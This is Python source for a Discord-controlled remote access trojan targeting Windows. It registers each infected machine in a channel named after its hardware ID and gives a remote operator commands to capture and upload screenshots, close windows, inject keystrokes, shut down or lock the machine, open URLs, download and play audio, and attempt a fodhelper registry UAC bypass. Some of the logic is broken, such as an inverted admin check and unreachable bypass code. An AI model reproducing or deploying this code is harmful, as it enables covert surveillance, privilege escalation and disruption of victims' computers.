import json
import discord
import uuid
import requests
import threading
import os
import tempfile
import random
import pygetwindow as gw
import pyautogui
from discord.ext import commands
import ctypes
import pygame
import win32api, win32con, win32gui
import time
import string
import winsound
import asyncio
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from urllib.request import urlretrieve

import os
import sys
import ctypes
import winreg

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() == False
    except:
        return False
    
def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise

def execute():        
    if not is_running_as_admin():
        return '[!] The script is NOT running with administrative privileges'
        try:                
            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)                
            os.system(FOD_HELPER)                
            sys.exit(0)                
        except WindowsError:
            sys.exit(1)
    else:
        return '[+] The script is running with administrative privileges!'

with open("config.json", "r") as file:
    discord_data = json.load(file)

intents = discord.Intents.default()
intents.message_content = True

target_channel = None
all_channel = None

lag_thread = None

bot = commands.Bot(command_prefix=discord_data['prefix'], intents=intents)

def Lag_Thread():
    while True:
        print("hi")

def create_and_run_temp_file(file_name, file_contents):
    base, ext = os.path.splitext(file_name)
    new_file_name = f"{base}_{random.randint(100000, 999999)}{ext}"
    path = os.path.join(tempfile.gettempdir(), new_file_name)
    with open(path, "w") as f:
        f.write(file_contents)
    
    os.system(f'start "" "{path}"')

@bot.event
async def on_message(message: discord.Message):
    global target_channel, all_channel
    if message.channel.id != target_channel.id and message.channel.id != all_channel.id:
        return
    
    await bot.process_commands(message)

@bot.event
async def on_ready():
    global target_channel, all_channel
    print("Logged in as " + bot.user.display_name)
    guild = bot.get_guild(1317774692337061888)
    all_channel = bot.get_channel(1317774692337061891)
    uid = str(uuid.UUID(int=uuid.getnode())).replace("-", "")
    for channel in guild.text_channels:
        if channel.name == uid:
            print("Found matching channel with id " + str(channel.id))
            target_channel = channel
            break

    if target_channel == None:
        print("Target channel not found, creating one instead")
        target_channel = await guild.create_text_channel(uid)

# @bot.command(name="proclist")
# async def proclist(ctx: commands.Context):
#     f = wmi.WMI()
#     pid_list = []
#     name_list = []

#     for win in f.Win32_Process():
#         pid_list.append(str(win.ProcessId))
#         name_list.append(str(win.Name))

#     if not pid_list:
#         await ctx.reply("No processes with visible windows found.")
#         return

#     pid_value = '\n'.join(pid_list)[:1024]
#     name_value = '\n'.join(name_list)[:1024]

#     embed = discord.Embed(title="Process List")
#     embed.add_field(name="PID", value=pid_value, inline=True)
#     embed.add_field(name="Name", value=name_value, inline=True)

#     await ctx.reply(embed=embed)

@bot.command(name="lag_start")
async def lag_start(ctx: commands.Context):
    global lag_thread
    if not lag_thread:
        await ctx.reply(":white_check_mark: Thread started! Program will sadly freeze :P")
        lag_thread = threading.Thread(target=Lag_Thread, daemon=True)
        lag_thread.start()
    else:
        await ctx.reply(":x: Already started lag thread!")

@bot.command(name='showmsg')
async def showmsg(ctx: commands.Context, *, message: str):
    contents = f'x=msgbox("{message}")'
    create_and_run_temp_file("temp.vbs", contents)
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="screenshot", aliases=["ss"])
async def screenshot(ctx: commands.Context):
    screen = pyautogui.screenshot()
    file_path = "temp500.png"
    screen.save(file_path)
    
    discord_file = discord.File(file_path)  # Correct variable usage
    await ctx.reply(file=discord_file)
    
    os.remove(file_path)  # Delete the file after sending

@bot.command(name="minimize_all")
async def minimize_all(ctx: commands.Context):
    windows = gw.getAllWindows()
    for window in windows:
        window.minimize()

    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="close_all")
async def close_all(ctx: commands.Context):
    windows = gw.getAllWindows()
    for window in windows:
        window.close()

    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="maximize_all")
async def maximize_all(ctx: commands.Context):
    windows = gw.getAllWindows()
    for window in windows:
        window.maximize()

    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="minimize_win")
async def minimize(ctx: commands.Context):
    window = gw.getActiveWindow()
    if window:
        window.minimize()

    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="close_win")
async def close(ctx: commands.Context):
    window = gw.getActiveWindow()
    if window:
        window.close()

    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="maximize_win")
async def close(ctx: commands.Context):
    window = gw.getActiveWindow()
    if window:
        window.maximize()

    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

INVERTED_COLORS = False

@bot.command(name="invert_colors")
async def invertcolors(ctx: commands.Context):
    global INVERTED_COLORS
    if INVERTED_COLORS:
        ctypes.windll.user32.SystemParametersInfoW(0x1042, 0, 0, 0)
        INVERTED_COLORS = False
        await ctx.reply(":white_check_mark: Set inverted colors to `False`!")
        return
    else:
        ctypes.windll.user32.SystemParametersInfoW(0x1042, 0, 1, 0)
        INVERTED_COLORS = True
        await ctx.reply(":white_check_mark: Set inverted colors to `True`!")
        return
    
def set_wallpaper(image_path):
    key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, win32con.KEY_SET_VALUE)
    win32api.RegSetValueEx(key, "WallpaperStyle", 0, win32con.REG_SZ, "2")  # 0=Centered, 2=Stretched, 6=Fit
    win32api.RegSetValueEx(key, "TileWallpaper", 0, win32con.REG_SZ, "0")
    win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, image_path, 1 + 2)

@bot.command(name="set_wallpaper")
async def set_wallpaper_command(ctx: commands.Context, *, url: str):
    try:
        # Download the image
        response = requests.get(url, stream=True)
        if response.status_code != 200:
            await ctx.reply("Failed to download the image. Please check the URL.")
            return
        
        # Save the image locally
        image_path = "temp_wallpaper.jpg"
        with open(image_path, "wb") as f:
            for chunk in response.iter_content(1024):
                f.write(chunk)
        
        # Set as wallpaper
        set_wallpaper(image_path)

        await ctx.reply("Wallpaper has been changed successfully! 🎉")

        # Optionally delete the image after setting the wallpaper
        os.remove(image_path)

    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command(name="max_volume")
async def max_volume(ctx: commands.Context):
    # Get default audio device
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    # Set volume to max (100%)
    volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(1.0, None)
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="min_volume")
async def min_volume(ctx: commands.Context):
    # Get default audio device
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    # Set volume to max (100%)
    volume.SetMasterVolumeLevelScalar(0.0, None)
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="rickroll")
async def rickroll(ctx: commands.Context):
    # Get default audio device
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    # Set volume to max (100%)
    volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(1.0, None)

    os.system("start https://www.youtube.com/watch?v=uHgt8giw1LY")
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="restart")
async def restart(ctx):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    os.system("shutdown /r /t 0")

@bot.command(name="shutdown")
async def shutdown(ctx):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    os.system("shutdown /s /t 0")

@bot.command(name="logoff")
async def logoff(ctx):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    os.system("shutdown /l")

@bot.command(name="sleep")
async def sleep(ctx):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

@bot.command(name="lock")
async def lock(ctx):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    os.system("rundll32.exe user32.dll,LockWorkStation")

@bot.command(name="website")
async def website(ctx: commands.Context, *, url: str):
    os.system("start " + url)
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")

@bot.command(name="shake_mouse")
async def shake_mouse(ctx):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    # Get current mouse position
    x, y = pyautogui.position()
    start_time = time.time()

    while time.time() - start_time < 10:
        # Check the current mouse position
        new_x, new_y = pyautogui.position()
        
        # If the mouse has moved, resume shaking from the new position
        if (new_x, new_y) != (x, y):
            x, y = new_x, new_y
        
        # Move the mouse slightly in random directions
        pyautogui.moveTo(x + random.randint(-50, 50), y + random.randint(-50, 50))
        time.sleep(0.05)  # Delay between shakes

@bot.command(name="keyboard_spam")
async def keyboard_spam(ctx):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    start_time = time.time()
    while time.time() - start_time < 10:
        # Select a random key from the alphabet and numbers
        key = random.choice(string.ascii_letters + string.digits + string.punctuation + ' ')
        # Press the random key
        pyautogui.press(key)
        # Wait 0.5 seconds between key presses
        time.sleep(0.1)
    

@bot.command(name="game_spam")
async def game_spam(ctx):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    # Define the set of keys you want to press
    keys = ['w', 'a', 's', 'd', 'e', 'g', 'f', 'space']
    
    start_time = time.time()
    while time.time() - start_time < 10:
        # Select a random key from the list
        key = random.choice(keys)
        # Press the random key
        pyautogui.press(key)
        # Wait 0.5 seconds between key presses
        time.sleep(0.1)

@bot.command(name="window_shake")
async def window_shake(ctx):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    # Get a list of all windows
    all_windows = gw.getAllWindows()

    # Unminimize all windows
    for window in all_windows:
        if window.isMinimized:
            window.restore()

    start_time = time.time()

    # Shake each window for 10 seconds
    while time.time() - start_time < 10:
        for window in all_windows:
            window: gw.Window
            if window.visible:
                # Get the current position of the window
                x, y = window.topleft

                # Shake the window by moving it slightly
                # Randomly move the window back and forth
                dx = random.randint(-10, 10)
                dy = random.randint(-10, 10)
                window.moveTo(x + dx, y + dy)
                
        time.sleep(0.05)  # Delay between shakes

@bot.command(name="keyboard_type")
async def keyboard_type(ctx: commands.Context, *, msg: str):
    await ctx.reply(f":white_check_mark: Making client type `{msg}`!")
    msg = list(msg)
    for letter in msg:
        pyautogui.press(letter)

@bot.command(name="win_beep")
async def win_beep(ctx: commands.Context, frequency: int = 1000, duration: int = 100):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    winsound.Beep(frequency, duration)


@bot.command(name="jumpscare")
async def jumpscare(ctx: commands.Context):
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")
    
        # Get default audio device
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    # Set volume to max (100%)
    volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(1.0, None)

    # URL to the scream sound file
    url = "https://github.com/jul15xn/fstore/raw/refs/heads/main/five-nights-at-freddys-full-scream-sound_2.mp3"
    
    # Download the file to a local path
    file_path = "scare.mp3"
    response = requests.get(url)
    with open(file_path, 'wb') as file:
        file.write(response.content)
    
    # Initialize pygame mixer
    pygame.mixer.init()

    # Load and play the sound
    pygame.mixer.music.load(file_path)
    pygame.mixer.music.play()

    # Wait for the sound to finish playing
    while pygame.mixer.music.get_busy():  # Check if sound is still playing
        await asyncio.sleep(1)  # Delay between checks

    # Remove the file after playback
    os.remove(file_path)

@bot.command(name="is_admin")
async def is_admin(ctx):
    await ctx.reply(f":exclamation: Is script running as admin: `{is_running_as_admin()}`")

@bot.command(name="uac_bypass")
async def uac_bypass(ctx):
    await ctx.reply("Trying to bypass UAC...")
    result = execute()
    await ctx.reply(result)

bot.run(discord_data['token'])
